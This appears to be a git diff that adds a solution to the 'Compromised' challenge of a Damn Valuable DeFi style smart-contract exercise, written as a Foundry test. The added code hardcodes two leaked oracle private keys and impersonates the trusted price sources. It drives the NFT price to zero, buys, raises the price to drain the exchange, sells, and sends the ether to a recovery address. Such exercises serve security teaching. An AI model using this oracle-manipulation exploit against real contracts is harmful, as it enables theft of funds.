@@ -7,7 +7,7 @@ import {VmSafe} from "forge-std/Vm.sol";
 
 import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
 import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
-import {Exchange} from "../../src/compromised/Exchange.sol";
+import {Exchange, AttackerContract} from "../../src/compromised/Exchange.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
 
 contract CompromisedChallenge is Test {
@@ -73,7 +73,32 @@ contract CompromisedChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_compromised() public checkSolved {}
+    function test_compromised() public checkSolved {
+        uint256 privateKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        uint256 privateKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+        address trustedSource1 = vm.addr(privateKey1);
+        address trustedSource2 = vm.addr(privateKey2);
+
+        AttackerContract attacker = new AttackerContract(oracle, exchange, nft, recovery);
+        payable(address(attacker)).transfer(PLAYER_INITIAL_ETH_BALANCE);
+        // require(success, "Failed to send ETH to attacker");
+
+        vm.prank(trustedSource1);
+        oracle.postPrice("DVNFT", 0);
+        vm.prank(trustedSource2);
+        oracle.postPrice("DVNFT", 0);
+
+        attacker.buyNFT();
+
+        vm.prank(trustedSource1);
+        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.prank(trustedSource2);
+        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+
+        attacker.sellNFT();
+        attacker.sendToRecovery(999 ether);
+
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
